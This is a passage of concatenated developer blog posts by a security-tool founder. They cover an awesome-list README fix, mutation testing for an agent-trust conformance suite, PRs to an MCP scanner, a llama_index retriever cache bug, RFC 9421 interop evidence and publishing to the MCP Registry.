Both were real, and both were ours. The README's NOT-list still claimed "no MCP server" while the read-only stdio bridge `alethech/mcp_memory.py` ships in the same repo; the status section was a version behind the actual v0.9.1 release. We fixed both in [6f13e51](https://github.com/eddyflores100-lang/alethech/commit/6f13e51) within the hour and credited the maintainer back with a `Co-Authored-By` trailer — he identified the spots, the same way we wrote the entry he landed. Courtesies that cost five seconds tend to be repaid in threads you did not expect.

The lesson generalizes beyond listings: **the README is the landing page, and its negative claims are checked harder than its positive ones.** A wrong "this project is not X" is worse than a missing feature, because it misroutes the exact visitor who came looking for X. Sync it before the listing lands, not after — the visitors arrive with the entry.

### What the listing pays — and what it does not

Pays:

- A permanent link from a discovery hub that the agent-memory niche actually reads, rendered with a live stars badge for our repo right in the list's entry.
- External validation: someone whose reputation is attached to a 657-star list checked the crypto claims against the code before listing. "Listed after a maintainer audit" is now a true sentence in our README, and it is referenceable in contexts where self-attestation is worthless.
- The co-authored commit on the list's `main`: git-history credit that survives independent of the README.

Does not pay:

- **Stars.** Stars belong to the list, not the listed. Our repo has zero stars one day in, and there is no mechanism that transfers them. Our fork of the list shows the network's star count but collects its own — it sits at zero, as forks of big lists generally do.
- Traffic, so far: 63 views / 28 uniques over the last 14 days, and the listing is one day old. The entry is a channel, not a faucet.

The gap worth naming: the same 14-day window shows **5,240 clones from 759 unique cloners** — with the honest caveat that CI pipelines and container builds are inside that number, so treat it as an upper bound on humans. People install plumbing; they do not star it. 759 unique cloners and 0 stargazers is the actual conversion problem this post exists to attack.

### The recipe, if you want the same outcome

1. Read the list's CONTRIBUTING before writing anything. Ours specifies star-ordering: 0-star projects go to the end of the Emerging block. We wrote the entry to land at the end, and it did.
2. Write the entry in their format, link-first, no marketing copy. Five lines, one of which is the badge.
3. State precisely what the project IS and IS NOT — the maintainer will check both halves against the code, and the NOT-half is where ours was wrong.
4. Expect the audit to cover: releases, CI, license, dead links, the API surface by which an agent actually reaches the feature you claim, and every technical claim in your description.
5. Fix what the audit finds, fast, and credit the finder in the fix commit.
6. A closed-but-landed PR with `Co-authored-by` is a win, not a rejection. Read the close reason before reacting to the state.

If you cloned alethech in the last two weeks and it held up: [the star button](https://github.com/eddyflores100-lang/alethech/stargazers) is the only routing signal other people's agents receive. The list entry renders our stars badge live, so the count is visible exactly where the readers are.

---

*I'm Edison Flores, founder of [AliceLabs LLC](https://github.com/alicelabs-llc) — we build open-source security infrastructure for AI agents. Independent verification of anything cited here is not just welcome, it's the point.*

title: v1.7.0 shipped: adversarial window sampling, generated mutants, and the survivor list published
description: The v1.4.0 commitment is live: adversarial validity-window sampling as a distribution, mechanical mutation testing with a published survivor list (46 mutants, 40 caught, 0 observable), and the clock+1d trade-off named honestly.
body_markdown:
## v1.7.0 shipped: adversarial window sampling, generated mutants, and the survivor list published

This is the follow-through on ["Re: @anp2network — all three critiques land"](https://dev.to/edison_flores_6d2cd381b13/re-anp2network-all-three-critiques-land-the-single-point-fixture-the-memorizer-turned-around-9g5), which committed to the changes queued as v1.4.0. They are now live on `main` as [manifest v1.7.0 / package 1.5.0](https://github.com/alicelabs-llc/universal-trust-adapter/tree/main/uta-monorepo/packages/conformance) — the suite had advanced to 1.6.0 (third-party interop evidence) while the work was queued, so the numbering continues from there. The content is what was promised, and CI now runs all of it on every push, [including mutation testing under `--strict`](https://github.com/alicelabs-llc/universal-trust-adapter/actions/workflows/ci-tests.yml).

Everything below is verifiable from the repo with Node ≥ 18 and no dependencies.

### 1. The lower bound is a distribution now

`generate-accept-vectors.mjs --mode adversarial` emits correctly-signed, anchored, active cards whose **only** defect is a violated validity window — so `expiry_check` must fail and everything else must pass:

| Bucket | Share | Range |
|---|---|---|
| future-issued | 55% | +2..7d (boundary band), +8..90d, +91..730d, +731..1460d |
| already-expired | 35% | including `expires_at == NOW` (the `>` boundary itself) |
| empty window | 10% | `issued_at == expires_at` in the future |

The fail-closed mirror rule: in valid-card modes a window violation is a FATAL; in adversarial mode a card that lands **in** window is a FATAL — the generator failing to produce its own defect. Accept mode additionally issues 20% of cards **today** (boundary-in band), so a runner using `<` instead of `<=`, or a clock-retarded runner, is caught by the sidecar cross-check pinning the generation-time clock.

One honest hole, named rather than hidden: adversarial future offsets floor at **+2 days** so a generated set stays re-scoreable across midnight (a +1d card flips in-window after midnight while the sidecar pinned the old truth). The `clock+1d` mutation therefore survives, by design. The trade-off is written into the generator's header and the survivor list — catching a +1d clock shift would cost portability of every generated set.

### 2. Generated mutants, survivor list published

[mutate-runner.mjs](https://github.com/alicelabs-llc/universal-trust-adapter/blob/main/uta-monorepo/packages/conformance/mutate-runner.mjs) applies a declared operator set — every comparison on the scored path (`cmp-swap`), every single-line guard (`guard-drop`), every block condition (`branch-negate`), and the clock ±1d — mechanically at every applicable site, and **executes** every mutant against the full suite. No hand-picking, which was the closed-set failure you named: our memorizer argument pointed at our own catalogue.

Classification is mechanical: **caught** (suite fails), **equivalent-on-suite** (exit 0, byte-identical `--json` output — suite-equivalence, not true equivalence), **observable-escape** (exit 0, output changed). Current state on 46 mutants: **40 caught, 6 equivalent, 0 observable**. [The survivor list is committed as an artifact](https://github.com/alicelabs-llc/universal-trust-adapter/blob/main/uta-monorepo/packages/conformance/mutation-survivors.json), and each survivor names something real:

- `clock+1d` — the deliberate midnight-portability trade-off above.
- The **meta-integrity check that guards the other checks can itself be disabled**. The runner now counts its own checks (byte-exactness, sidecar and stage cross-checks each exactly once per entry — a skipped check is a FATAL), and mutation testing immediately found that the counter assertion itself can be negated. Self-verification bottoms out somewhere. That is not a defeat; it is the demonstration of exactly your Rekor point — internal checks cannot certify their own execution, and the exit is *external* cross-anchoring (same digest republished from origins that don't share control), which stays queued after this release.
- The rest are dead-path-under-`--json`, error-message-only, and a provably order-neutral JCS comparator mutant on this suite's key sets.

Three of the tightenings shipped in this release were found by the mutation run itself, then closed: `--generated` on the command line that isn't parsed or yields zero cards is now a FATAL (a silently-ignored input used to be a green run); sidecar cross-checks are sha256-bound to the card bytes (on a uniform set, cross-checking the *wrong* row still agreed on `expected_verify`); and those completion counters above. The survivor list shrank as the derived-truth checks tightened — the loop you asked about works.

### 3. The matrix, with the window asked distributionally

```plaintext
| Runner                                  | fixed | adversarial (40) |
|-----------------------------------------|-------|------------------|
| always-true                             | 8/14  | 0/40             |
| policy-only (Ed25519 deleted)           | 11/14 | 40/40            |
| crypto-only (no expiry/status)          | 11/14 | 0/40             |
| embedded-key + policy (TOFU)            | 13/14 | 40/40            |
| memorizer (hardcodes valid-atc digest)  | 12/14 | 40/40            |
| over-rejector (chokes on x_* fields)    | 13/14 | 40/40            |
| stage-liar                              |  7/14 | 0/40             |
| reference (pinned + policy + tolerance) | 14/14 | 40/40            |
```

`crypto-only` at **0/40** is the row that didn't exist before: a runner with intact cryptography and no window enforcement now fails against a *distribution* of window violations, not one frozen 2030 timestamp. The memorizer's 40/40 on adversarial is honest too — always-false happens to match always-reject; its weakness shows on the accept side, which is why the CI job scores both a fresh adversarial set and a fresh accept set on every push.

### What to re-run

```bash
node vectors/generate-accept-vectors.mjs --mode adversarial --count 40 --seed 7 --out .gen-adv
node score-runner.mjs --generated .gen-adv
node mutate-runner.mjs --generated .gen-adv --out survivors.json
```

The two questions from the last article are now answerable by anyone with the repo: the runner's rejection rate holds across the sampled boundary (not one timestamp), and the survivor list — not a caught-count — is the published claim. Rekor cross-anchoring remains queued after this release, still not dressed up as done.

---

*I'm Edison Flores, founder of [AliceLabs LLC](https://github.com/alicelabs-llc) — we build open-source security infrastructure for AI agents. Independent verification of anything cited here is not just welcome, it's the point.*

title: Re: @anp2network — all three critiques land: the single-point fixture, the memorizer turned around, and the v1.4.0 plan
description: Accepting three precise critiques of the UTA conformance vectors: the lower-bound fixture gap, the closed-catalogue mutant problem, and the Rekor origin question — plus the v1.4.0 plan that addresses them.
body_markdown:
## Re: @anp2network — all three critiques land: the single-point fixture, the memorizer turned around, and the v1.4.0 plan

This is a reply to @anp2network's comment (id 3ehcp, 2026-09-10) on my previous article about vectors v1.3.3.

Short version: your validation is noted and appreciated — and every one of the three critiques you attached to it is correct, so this article is a concession note, not a defense. What follows accepts each point precisely, then commits to what changes in v1.4.0 and in what order.

---

### 1. The lower bound: one constant is a fixture, not a distribution

You wrote that 0/60 is a measurement of the generator, not of the runner's window. Correct, and worth restating in the bluntest form: after v1.3.3, the generated suite stopped asking whether a runner rejects future-dated cards *at all*. The property that 32 randomized cards used to exercise (scored wrong, but exercised) is now carried by `premature-atc` alone — one card, `issued_at` frozen at `2030-01-01`.

A runner can special-case that exact timestamp and still mishandle every other issuance time in the future half-plane. `now + 5s`, `2030-01-02`, a card whose `issued_at` is one clock-tick ahead of the scorer — none of those are in the suite. The "exact mirror of `expired-atc`" framing I used is also the confession: a mirror that is one constant is a fixture. The fixed suite covers one point of the half-plane, and I won't pretend it covers the half-plane.

### 2. The memorizer, pointed back at us

The second critique is the one that stings most, because it's our own argument: the closed-catalogue case against the memorizer applies to a hand-listed mutant catalogue for the same reason — memorizing wins whenever the set it has to cover is closed and small.

The 10/10 mutant detection establishes exactly what it says: those ten are detected. The catalogue was written after the defects were known. That ordering disqualifies any claim beyond detection of the listed set; it cannot estimate what fraction of the remaining failure space walks through. Fair hit, fully conceded.

### 3. What v1.4.0 changes — both land together

**Adversarial generation mode.** The generator gets an explicit `--adversarial` flag that emits *correctly signed* cards violating the validity window, with `expected_verify: false`, cross-checked against derived truth — never the sidecar, per the asymmetry you identified: an absent file can't lie, a disagreeing one can. Issuance offset is sampled relative to the scoring clock, with deliberate mass at and a few seconds past the boundary, so the bound is tested by a distribution instead of a fixture. `FATAL` stays reserved for unintended violations in valid-card mode; window violations under `--adversarial` are expected failures, not errors.

**Generated mutants.** The hand-listed catalogue is replaced by generation: a declared set of syntax-level operators — negate branch condition, swap comparison direction, drop a guard, off-by-one the clock — applied at *every* applicable site in `score-runner.mjs`, mechanically rather than by hand. What gets published is the survivor list, with equivalent mutants separated out. Each survivor names a check the suite doesn't enforce; that list is the claim, a caught-count is not.

### 4. Rekor: commit-to-existence is not serving-integrity

Your cut here is exact: the entry commits to a digest existing at a point in time. It says nothing about whether any origin serves those bytes *now* — and a stranger who pulls both the scorer and its expected digest from the same hub runs a comparison that never leaves that origin. The honest label for the current setup is "tamper-evidence with an anchored timestamp," not "independent verification."

The fix direction is cross-anchoring: the same digest republished from origins that don't share control — the npm tarball, the Rekor entry, and at least one host we don't operate — so a mismatch anywhere becomes a checkable event rather than trust in one hub. That is queued after v1.4.0. I am not dressing it up as done.

---

### What to ask when you re-run after v1.4.0

The two questions worth asking are the ones you'd ask anyway:

1. Does the runner's rejection rate hold at the sampled boundary — not just at the one frozen timestamp?
2. Does the survivor list shrink when the derived-truth checks tighten — and are the survivors that remain genuinely equivalent mutants, or named gaps?

The suite's job is to make those questions answerable by anyone with the repo and a clock. v1.4.0 is scoped to exactly that.

---

*I'm Edison Flores, founder of [AliceLabs LLC](https://github.com/alicelabs-llc) — we build open-source security infrastructure for AI agents. The conformance vectors live in the [universal-trust-adapter](https://github.com/alicelabs-llc/universal-trust-adapter) repo; independent verification of anything cited here is not just welcome, it's the point.*

title: Three merged PRs in an MCP security scanner: the review that found my bug, and two more
description: What actually landed in mcp-guard this week: an npm attestations verifier whose happy path could never fire (caught in review), keyword matching without false positives, and exit codes as API.
body_markdown:
## What happened

Three PRs merged into [yunaremaia/mcp-guard](https://github.com/yunaremaia/mcp-guard) — a supply-chain/security scanner for MCP servers — in roughly 36 hours:

| PR | What it did | The interesting part |
|---|---|---|
| [#87](https://github.com/yunaremaia/mcp-guard/pull/87) | `scan --fail-on low` no longer exits 1 on a *clean* empty scan | the root cause was `max(..., default=0)` vs a threshold of `0` |
| [#88](https://github.com/yunaremaia/mcp-guard/pull/88) | keyword matching no longer flags read-only tools as CRITICAL | substring matching + the false-positive/false-negative trade-off |
| [#86](https://github.com/yunaremaia/mcp-guard/pull/86) | `mcp-guard verify` — npm supply-chain verification (attestations, provenance, strict policy) | **the maintainer's review found that my feature could never report "signed"** |

That last cell is the reason this post exists. The rest is what the merge taught.

## The embarrassing one: a feature that could never say "yes"

`verify` resolves an npm package ref, hits the registry, and checks for [npm's provenance attestations](https://github.com/npm/attestations) (sigstore bundles). I shipped v1 with the documented endpoint shape:

```http
GET /-/npm/v1/packages/attestations/{name}/{version}
```

316 tests green, 100% coverage on the new module, smoke-tested live against the registry. Merged? Not yet — [the review](https://github.com/yunaremaia/mcp-guard/pull/86) came back with a reproduction: **that URL 404s for every package, including `@sigstore/sign`** — the reference implementation of the thing being verified. Every verdict was structurally "unsigned." A security tool whose happy path can never fire.

The real contract, verified against the live registry:

- `GET /{name}/{version}` (the manifest) carries `dist.attestations.url` when — and only when — the version is signed
- packages without attestations simply lack the field
- the packument (`GET /{name}`) carries it per-version under `versions[v].dist.attestations`
- only the *pathname* of the discovered URL is trusted; it's re-attached to the registry origin, never followed as an absolute host (normalization in the spirit of pacote)

So the manifest became the single source of truth: unpinned refs resolve `dist-tags` + `versions[latest]` from the packument; pinned refs fetch the manifest directly and a 404 there is a real `not_found` instead of a disguised `unsigned`. Two states that a policy gate (`--policy strict`, exit 1 on unsigned) must never confuse.

**The takeaway**: green tests mean the code matches *your model* of the world. The reviewer's repro checked the model. For anything that talks to a live registry, "verified in vivo" needs to include the negative control — and ideally someone who tries the endpoint you were *sure* about.

## The subtle one: when a fix trades a false positive for a false negative

mcp-guard flags tools as write/destructive by keyword. It matched substrings: `get_address` contained "add"... which is a write verb fragment; worse, names like `read_settings` and `search_update_records` tripped the update rule. Read-only tools flagged CRITICAL ([#84](https://github.com/yunaremaia/mcp-guard/pull/84)).

The fix design:

- **names** are tokenized (snake/kebab/camelCase split with `[\s_\-.]+` after camel splitting) and matched per whole segment
- **descriptions** match on word boundaries
- a leading **read-only verb** (`get`, `read`, `list`, `search`, `fetch`, …) suppresses *only* the name-based match — the description channel stays live

First version of the guard: [the review caught it](https://github.com/yunaremaia/mcp-guard/pull/88#issuecomment-5972930919-ish) — `get_and_delete_user` stopped flagging. For a security tool, trading "read-only flagged as critical" for "destructive not flagged at all" is the wrong direction. The merged rule: suppression only while the keyword follows the verb **directly through a conjunction** (`get_delete_and_remove_user` still flags, `get_and_delete_user` doesn't), plus inflection handling (`Deletes`/`dropping`/`modifies`) for descriptions.

Same lesson as the fusion post from today, inverted: assert the shape of the whole class, not just the case you came to fix. The test suite parametrizes both directions — the five false positives from the issue *and* the true positives the naive guard would have swallowed.

## The small one: exit codes are API

`--fail-on low` with a *zero-findings* scan exited 1, because `max(severities, default=0) >= 0` is always true. An empty scan is "nothing found at the strictest gate" — that's success ([#82](https://github.com/yunaremaia/mcp-guard/pull/82), fixed by `default=-1`). Two-line fix, two regression tests, and worth filing anyway: CI pipelines drink exit codes, and a flaky `1` on clean scans trains people to ignore the gate.

## What actually got three PRs merged

Not talent — shape:

1. **One mechanism per PR.** The exit-code PR didn't touch the matcher. The matcher PR didn't touch exit codes. Reviewable in one sitting, revertable independently.
2. **Tests that fail first.** Every PR's tests were verified red on `main` before the fix was claimed. Three of four in #88, both in #87.
3. **Repro before argument.** Every issue got the mechanism verified live (the exact versions, the exact numbers) before a fix was proposed.
4. **Review comments answered with commits, not prose.** Both reviews came back with technical objections; both were answered by push + a comment explaining the diff. The maintainer merged within hours of each.
5. **Scope honesty.** `drop_in_query` still false-flags (adjective vs verb needs semantics) — documented in the PR as out of scope rather than silently shipped.

The repo is young, the maintainer is fast and rigorous, and the issues are real bugs with clean repros — if you want a place to practice security-tool contributions, [the issue tracker](https://github.com/yunaremaia/mcp-guard/issues) is open.

*Disclosure: the investigation, fixes and tests were AI-assisted (Claude/GLM), human-directed — same disclosure is on the linked PRs. The mcp-guard maintainer's reviews are what made all three PRs better than their first versions.*

title: One bug class, four fusion modes: finding cache corruption in QueryFusionRetriever
description: How extending one bug repro to all four fusion modes of QueryFusionRetriever exposed a mutation class that corrupts retriever caches — and the test pattern that catches it anywhere.
body_markdown:
## What happened

On 2026-10-03, [michaelswissa filed a bug](https://github.com/run-llama/llama_index/issues/23332) in `llama_index`: `QueryFusionRetriever` corrupts rankings when a caching retriever returns shared `NodeWithScore` wrappers. Relative and distance-based fusion normalize scores **in place**, so a wrapper shared across queries gets normalized for one result set and then read back as if it were another's.

His patch ([#23333](https://github.com/run-llama/llama_index/pull/23333)) fixes two of the four fusion modes. While reviewing it, I extended his reproduction script to all four modes — and the same mutation class was live in the other two:

- `reciprocal_rerank` writes fused scores back into the retriever's own wrappers
- `simple` mutates the first-seen wrapper for a node hash (the subtle one)

Filed as [#23351](https://github.com/run-llama/llama_index/issues/23351); the `simple` half is fixed in [#23352](https://github.com/run-llama/llama_index/pull/23352). This post is the full anatomy of the bug class, because it generalizes far past this retriever.

## The class: fusion that mutates what it doesn't own

Every fusion mode receives `Dict[Tuple[str, int], List[NodeWithScore]]` — query results the *retriever* produced. Any write into those wrappers is a write into someone else's state. If the retriever caches (per node, per query, whatever), your "harmless normalization" silently rewrites its cache.

The original issue caught the loud variant:

```python
# _relative_score_fusion — normalizes in place
node_with_score.score = (node_with_score.score - min_score) / (max_score - min_score)
```

A shared wrapper normalized for result set A is then summed again for result set B. The relevant document ends up at `-3.0` and ranks last. Loud, reproducible, fixed by #23333.

## The quiet variant: reciprocal_rerank

RRF computes ranks first, scores second, then writes back:

```python
reranked_nodes.append(hash_to_node[hash])
reranked_nodes[-1].score = score   # writes into the retriever's wrapper
```

The current call's ranking is correct — ranks were computed before the write-back. The corruption lands *after*: the cached `0.9 / 0.1 / 0.8` become RRF fused scores (`~0.0333 / ~0.0164`), and every subsequent retrieval from that cache returns garbage. Same class, but the symptom is invisible unless you assert on the cache itself:

```plaintext
mode=reciprocal_rerank  ranking=['relevant', 'low', 'other']   # correct
    cache after: orig=[0.0333, 0.0164] alt=[0.0333, 0.0164]    # corrupted
```

## The trap: why `simple` looked clean

`_simple_fusion` dedups by node hash and writes the max back:

```python
max_score = max(node_with_score.score or 0.0, all_nodes[hash].score or 0.0)
all_nodes[hash].score = max_score   # writes into the retriever's wrapper
```

Run the shared-wrapper repro from #23332 against it and **nothing happens** — `max(0.9, 0.9)` is identity. The obvious test passes, the mode looks clean, and the bug ships.

The trigger requires the same node hash to arrive via **distinct wrappers with different scores** — exactly what a per-query cache produces when scoring depends on the query (BM25, query-weighted retrievers):

```python
class PerQueryCacheRetriever(BaseRetriever):
    def __init__(self):
        super().__init__()
        self.node = TextNode(text="relevant", id_="relevant")
        self.results = {
            "original":   [NodeWithScore(node=self.node, score=0.4), ...],
            "alternate": [NodeWithScore(node=self.node, score=0.9), ...],
        }
```

Fusion runs; the dedup max-write puts `0.9` into the wrapper owned by "original"'s cached results. That query's cache is silently rewritten with another query's score. No exception, no ranking change in the current call — just corrupted state for every future retrieval.

**The lesson that generalizes**: a repro built from one cache shape (shared wrappers) is a single point of failure. When the mechanism is "write into inputs," enumerate the aliasing shapes — same object in many lists, distinct objects with one hash — and assert the post-state of *every* shape, not just the output.

## How to find this class anywhere

Three steps, ~30 minutes per suspect function:

1. **Grep for writes into inputs.** `x.score =`, `x[...] = ...` where `x` came from a parameter. In fusion_retriever.py this is literally four functions, two of which write into their arguments.
2. **Assert on the caller's state, not the return value.** Every regression test in #23352 checks `base.results[...]` after fusion — the outputs were never wrong; the caches were.
3. **Test ownership, not just values.** The strongest assertion is aliasing: mutate the returned wrapper, assert the input didn't move.

```python
result = fusion.retrieve("original")
result[0].score = 999.0
assert base.results["original"][0].score == 0.4   # ownership proven
```

## The fix family

Two shapes, both correct, different blast radius:

- **Per-occurrence copies at the dispatch sites** — one invariant ("fusion works on copies") covering all modes. Copy each wrapper per occurrence *per list*, never deduped by identity: the same object appearing in two lists must become two copies, or relative normalization computes the wrong min/max per list. (An identity-keyed copy cache is the wrong-shaped optimization for this exact input.)
- **Fresh output wrappers per function** — what #23352 does for `simple`: keep `(node, max_score)` tuples in the dedup dict, build new `NodeWithScore` objects at the end. Smallest surface, merges alongside in-flight fixes without touching their lines.

One wrinkle worth knowing before you patch a big repo: [PR #21445](https://github.com/run-llama/llama_index/pull/21445) has been sitting on the RRF write-back since April (blocked, stalled). Any fix that touches those ten lines inherits its rebasing duty. "Is this hunk already claimed?" is now part of my checklist before writing a patch.

## What landed

- [#23351](https://github.com/run-llama/llama_index/issues/23351) — the follow-up issue michael asked for, with the distinct-wrapper repro for `simple` (michael's review catch: don't trade a false positive for a false negative, keep the fix scoped)
- [#23352](https://github.com/run-llama/llama_index/pull/23352) — the `simple`-mode fix: 4 regression tests, 3 fail on `main` without it, full retrievers suite green

Verification was done live against `llama-index-core` 0.14.25 before filing anything, and every claim in this post comes from that run — including the numbers.

*Disclosure: the investigation and repro work were AI-assisted (Claude/GLM), human-directed; the same disclosure is on the linked issues and PRs.*

title: First third-party interop evidence: live Agent Trust Cards over RFC 9421 (conformance v1.4.0)
description: What happened   On 2026-10-02, the UTA conformance suite captured its first third-party...
body_markdown:
## What happened

On 2026-10-02, the UTA conformance suite captured its first **third-party interoperability evidence**: three live exchanges between the MarketNow verifier and [AgentBouncer](https://agentbouncer.io) (beta) — an external agent-trust gateway — over **RFC 9421 signed HTTP**, with the `x-uta-trust` header as a *covered component* of the request signature.

It shipped the next day as `@marketnow/uta-conformance@1.4.0` (npm, 2026-10-03T02:36Z) and commit [`25696d48`](https://github.com/alicelabs-llc/universal-trust-adapter/commit/25696d4829) on `main`.

Three paths were exercised. The three outcomes are the whole point:

| Path | Card | Envelope (AgentBouncer) | Trust verdict (UTA) | Composed result |
|---|---|---|---|---|
| unsigned control | — | `verified: false`, `reason: "no_signature"` | not reached | rejected at the envelope layer |
| allowed | `ATC-2026-003701` | signature valid, replay checked | **PASS** — 8/8 controls, caps match | allowed |
| denied | `ATC-2026-003702` | signature valid, replay checked, `allowed: true` | **POLICY_FAIL** — action `mcp:tools/call` requires `network.egress=allowlist`, card grants none | denied |

## Why the denial is the interesting row

Read the third row carefully: **AgentBouncer accepted the request at its own layer, and the composed system still denied it.** That is the experiment working, not failing.

The two cards were sent with the *same request body* — the `content-digest` header is byte-identical in both live requests (`sha-256=:vRx4QTR9SRY9lK3tmE4cM1/3IGpPXZ6ij1TcUI5mYmY=:`), same endpoint, same signature coverage. The only variable is the trust token in the covered `x-uta-trust` header (2,227 vs 2,220 base64url bytes). One card grants `network.egress=allowlist`; the other grants nothing. Everything else held constant, the verdict flipped from PASS to POLICY_FAIL.

That isolation is what makes the evidence meaningful. It shows the denial is attributable to **trust policy, not transport** — and that a gateway which passes the envelope cannot smuggle through a card that the trust layer rejects. Composed verdicts, clean attribution, fail-closed at the layer that owns the decision.

## Covered component, briefly

RFC 9421 signs HTTP messages by listing header fields in `Signature-Input`. The `x-uta-trust` header is in that list, which means the trust token is **bound into the request signature**: you cannot sign a request and swap the card afterwards, because the signature check and the card bytes are verified against the same covered set. The card travels as `base64url(JSON of the full ATC/1.0 document)` in that header; AgentBouncer verifies the envelope (signature, timestamp, replay, project key/policy) and — per the vendor's own clarification on 2026-10-01 — **does not parse the ATC or enforce its capabilities**. The UTA verdict is produced independently by the MarketNow verifier.

Each layer rejects for its own reasons. The unsigned control died at the envelope (`no_signature`) without the trust layer ever being reached. The denied card survived the envelope and died at policy. The allowed card passed both. Three outcomes, three different failure/success layers, no ambiguity about who decided what.

## What is claimed — and what is not

**Claimed:** two live exchanges captured on 2026-10-02 against AgentBouncer's public test endpoint, envelope-verified by the counterparty, trust-verified by UTA, published as evidence vectors in `vectors/third-party/`, with the full request headers, digests, verdicts, and timing in the traces file. Every byte of that is checkable at the URLs below.

**Not claimed:**

- These are **evidence artifacts, not scored vectors**. The 14-vector scored set is unchanged, byte-for-byte. A live counterparty is neither deterministic nor self-contained, so it cannot be part of the scored set — the scored set must stay runnable offline by a stranger with a git clone and nothing else.
- This is **not an endorsement** in either direction. The counterparty is a beta product at a public test endpoint. We are documenting what happened on the wire, not certifying the vendor.
- AgentBouncer did **not** verify the Agent Trust Card itself. Envelope binding and trust verification are different jobs; this exchange exercised both, held by different parties.

## Verify it yourself

Everything below is live:

```bash
# the interop index (schema, both evidence vectors, verdicts)
curl -s https://www.marketnow.site/uta/conformance/vectors/third-party/_interop-index.json

# the two evidence files (card ids, counterparty verdicts, UTA verdicts)
curl -s https://www.marketnow.site/uta/conformance/vectors/third-party/agentbouncer-transport-allowed.json
curl -s https://www.marketnow.site/uta/conformance/vectors/third-party/agentbouncer-transport-denied.json

# the full traces: request headers, content-digest, token sizes, unsigned control
curl -s https://www.marketnow.site/uta/conformance/vectors/third-party/traces_20261002_final.json

# the scored set is still 14/14 and unchanged
npx @marketnow/uta-conformance

# the npm release and the commit
npm view @marketnow/uta-conformance dist-tags.latest   # 1.4.0
```

Or read them in the repo: [`uta-monorepo/packages/conformance/vectors/third-party/`](https://github.com/alicelabs-llc/universal-trust-adapter/tree/main/uta-monorepo/packages/conformance/vectors/third-party).

## Where this fits

The suite's job has been the same since v1.2.0: separate real verifiers from fake ones. v1.3.0 made the accept side unbounded (generator + published test CA). v1.3.3 added two-sided validity windows and per-stage scoring — a runner that fires the right verdict for the wrong reason now scores wrong. v1.4.0 adds a different axis entirely: not "does your runner verify cards correctly" (still 14 vectors, still the job) but "**does the protocol actually travel** between a signer's stack and someone else's gateway, over a standard signed-HTTP transport, without the trust meaning getting lost in translation."

That question only has evidence-based answers. This is the first entry.

## State of everything else (2026-10-03)

- **MCP Registry**: still listed and active — `io.github.alicelabs-llc/marketnow` v1.15.0, both the streamable-http remote and the `marketnow-mcp` npm stdio package. `marketnow-mcp`: 2,131 downloads last month.
- **M8ven rating badge** went into the README on 2026-10-01 — C, 74/100. Publishing the score we got, not the score we wanted.
- **alethech 0.9.1** is on PyPI (since 2026-09-30) — the verifiable agent-memory protocol, with the mutation-guard test paths from the last post.
- Five dependabot CI-action bumps were merged to `main` the same day v1.4.0 shipped. CI green.

Next on the conformance roadmap: more counterparties (the evidence format is deliberately counterparty-agnostic), and the runner-under-test pinning rule — the reference scorer is now a *tested* component, not a *trusted* one: its bytes are digest-pinned and its behavior must reproduce the pinned answer key across five surfaces. More on that when the next evidence lands.

title: We got into the official MCP Registry — the parts the docs don't cover
description: MarketNow is now listed in the official MCP Registry (registry.modelcontextprotocol.io) as...
body_markdown:
MarketNow is now listed in the **official MCP Registry** (`registry.modelcontextprotocol.io`) as `io.github.alicelabs-llc/marketnow` v1.15.0 — both as a remote streamable-http server and as the npm stdio package `marketnow-mcp`. This post documents the submission path that actually works in 2026, and the three things the docs don't warn you about.

## What's listed

```yaml
name:      io.github.alicelabs-llc/marketnow
version:   1.15.0
remotes:   streamable-http → https://marketnow.site/api/mcp/
packages:  npm marketnow-mcp 1.15.0 (stdio)
repo:      github.com/alicelabs-llc/MARKETNOW
```

You can verify it yourself:

```bash
curl "https://registry.modelcontextprotocol.io/v0/servers?search=io.github.alicelabs-llc"
```

The entry appeared on the registry homepage's "Recently Updated" section the same day. If you build MCP tooling that consumes the registry (that's most agent frameworks now), MarketNow is discoverable from there — 8 tools covering credential verification (ATC v3, JWT/OAuth, W3C VC, MCP Card, A2A, EAT-AI, ZTA, SPIFFE, X.509), format translation, domain scam-checks, revocation status, and a search index of 68k+ security-scored MCP servers.

## The submission path in 2026: no more PRs

The old workflow — open a PR against `modelcontextprotocol/servers` — is closed (issue #4616: "not planned"), and the current `CONTRIBUTING.md` of `modelcontextprotocol/registry` says explicitly: *do not* open a PR to add your server to `data/seed.json`. The seed file is dev-only data.

The supported path is the `mcp-publisher` CLI:

```bash
# 1. install (linux/amd64; brew also works)
curl -L "https://github.com/modelcontextprotocol/registry/releases/latest/download/mcp-publisher_linux_amd64.tar.gz" | tar xz mcp-publisher

# 2. authenticate — GitHub PAT works headless (CI-friendly)
mcp-publisher login github -token $PAT

# 3. describe your server (mcp-publisher init gives you a template)
# 4. validate, then publish
mcp-publisher validate
mcp-publisher publish
```

**Namespace rules that matter:**

- GitHub auth → your server name must be `io.github.<username>/*` or `io.github.<orgname>/*`
- Publishing under an **org** namespace requires being an *Owner* of the org (plain membership is no longer enough), and the PAT must be able to read your org role — `read:org` for classic PATs, "Members: Read-only" for fine-grained
- If you control the domain your server runs on, DNS auth (`site.yourdomain/*`) and HTTP auth (`/.well-known/mcp-registry-auth`) also work — both use an Ed25519 keypair and a `v=MCPv1` proof record at the apex

## Three gotchas the docs don't cover

**1. `description` is capped at 100 characters — the schema won't tell you.** My first `validate` attempt passed local schema checks and failed server-side with a 422 `expected length <= 100` on `body.description`. The JSON schema published at `static.modelcontextprotocol.io` doesn't encode the limit. Keep it capability-focused: "Verify AI agent credentials, translate 9 formats, check scam domains, search 68k+ MCP servers." — 95 chars, done.

**2. Remote URLs are globally unique — and a *deprecated* entry still holds yours.** MarketNow was first published to the registry in June/July under a personal GitHub account we no longer use. One of those old entries registered `https://marketnow.site/api/mcp` as an `sse` remote, and even though that entry is marked **deprecated**, the URL remains claimed: my publish attempt failed with `remote URL ... is already used by server io.github.edgarfloresguerra2011-a11y/marketnow-mcp`.

The workaround: the endpoint also serves at the trailing-slash variant `https://marketnow.site/api/mcp/` (verified with a live `initialize` handshake), which the registry treats as a distinct URL. That's what's published now.
